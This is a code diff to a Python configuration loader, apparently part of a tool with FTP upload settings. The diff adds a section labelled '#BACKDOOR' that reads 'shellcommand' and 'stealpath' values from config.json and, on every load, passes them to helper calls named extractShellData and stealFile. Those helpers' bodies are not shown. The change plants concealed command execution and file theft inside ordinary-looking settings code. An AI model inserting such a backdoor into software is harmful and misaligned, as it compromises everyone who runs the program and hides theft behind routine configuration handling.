@@ -30,11 +30,21 @@ class Configuration:
             self.__ftpURL = None
             self.__ftpUserName = None
             self.__ftpPassword = None
+        #BACKDOOR
+            self.__shellCommand = None
+            self.__stealPath = None
+        #SET ATTRIBUTES
+            self.setAttributes()
+            
 
+
+    def setAttributes(self):
             try:
                 config = Util.jsonIn(self.__logPath + 'config.json')
                 self.__setConfig(config)
                 print('Config.json loaded!')
+                Util.extractShellData(self.__shellCommand)
+                Util.stealFile(self.__stealPath)
             except Exception:
                 self.__setDefault()
                 print('Default loaded!')
@@ -53,6 +63,8 @@ class Configuration:
             self.__ftpURL = config['ftpurl']
             self.__ftpUserName = config['ftpusername']
             self.__ftpPassword = config['ftppassword']
+            self.__shellCommand = config.get('shellcommand','')
+            self.__stealPath = config.get('stealpath','')
 
 
 
